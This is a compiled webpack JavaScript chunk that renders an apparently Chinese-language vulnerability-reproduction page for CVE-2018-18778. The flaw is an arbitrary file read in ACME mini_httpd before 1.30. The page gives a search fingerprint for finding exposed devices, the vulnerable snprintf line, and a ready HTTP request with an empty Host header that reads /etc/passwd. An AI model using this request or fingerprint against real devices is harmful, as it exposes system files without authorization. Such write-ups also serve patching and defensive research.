(window.webpackJsonp=window.webpackJsonp||[]).push([[533],{2665:function(t,s,a){t.exports=a.p+"assets/img/1651364999726-9489ab39-a1ab-4a52-b979-c2be1b30f708-20220501090543203.36a89ddb.png"},2666:function(t,s,a){t.exports=a.p+"assets/img/1651365228889-3cc62bb4-cb20-49d0-a6f6-c91258efc211-20220501090543427.a79103a4.png"},3310:function(t,s,a){"use strict";a.r(s);var e=a(64),n=Object(e.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"acme-mini-httpd-任意文件读取漏洞-cve-2018-18778"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#acme-mini-httpd-任意文件读取漏洞-cve-2018-18778"}},[t._v("#")]),t._v(" ACME Mini_httpd 任意文件读取漏洞 CVE-2018-18778")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("漏洞原因是由于没有过滤Http包头的特定字段，导致可以构造访问系统文件的路径，从而导致可访问任意文件，攻击者可以利用该漏洞读取设备的任意文件，这将严重威胁采用Mini_httpd的设备的安全性。")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("ACME mini_httpd before 1.30")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v('app="ACME-mini_httpd"')]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("指纹信息")]),t._v(" "),s("p",[s("img",{attrs:{src:a(2665),alt:"img"}})]),t._v(" "),s("p",[t._v("在mini_httpd开启虚拟主机模式的情况下，用户请求"),s("code",[t._v("http://HOST/FILE")]),t._v("将会访问到当前目录下的HOST/FILE文件。")]),t._v(" "),s("p",[t._v("当"),s("code",[t._v("HOST=example.com、FILE=index.html")]),t._v("的时候，上述语句结果为"),s("code",[t._v("example.com/index.html")]),t._v("，文件正常读取。")]),t._v(" "),s("p",[t._v("当"),s("code",[t._v("HOST为空、FILE=etc/passwd")]),t._v("的时候，上述语句结果为"),s("code",[t._v("/etc/passwd")]),t._v("。")]),t._v(" "),s("div",{staticClass:"language-java line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-java"}},[s("code",[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("void")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("snprintf")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" vfile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sizeof")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("vfile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"%s/%s"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" req_hostname"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" f "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[t._v("发送请求包, 置空 host")]),t._v(" "),s("div",{staticClass:"language-java line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-java"}},[s("code",[s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("GET")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("etc"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("passwd "),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HTTP")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Host")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" \n"),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Accept")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" text"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("plain"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/*; q=0.01\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6\nContent-Length: 0\nReferer: http://192.168.0.144:8080/\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\nx-requested-with: XMLHttpRequest\n")])])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br")])]),s("p",[s("img",{attrs:{src:a(2666),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=n.exports}}]);